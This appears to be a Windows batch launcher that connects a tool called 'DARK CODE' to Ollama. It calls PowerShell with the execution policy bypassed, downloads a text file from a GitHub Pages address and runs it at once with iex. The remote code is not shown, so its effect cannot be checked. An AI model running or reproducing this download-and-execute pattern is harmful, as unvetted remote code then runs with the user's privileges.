@echo off
title DARK CODE - Ollama Connect
echo Connecting DARK CODE to Ollama...
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.ServicePointManager]::SecurityProtocol -bor 3072; $wc=New-Object Net.WebClient; $wc.Encoding=[Text.Encoding]::UTF8; iex $wc.DownloadString('https://jake12733.github.io/darkcode-orchestrator/connect/win.txt')"
if errorlevel 1 pause
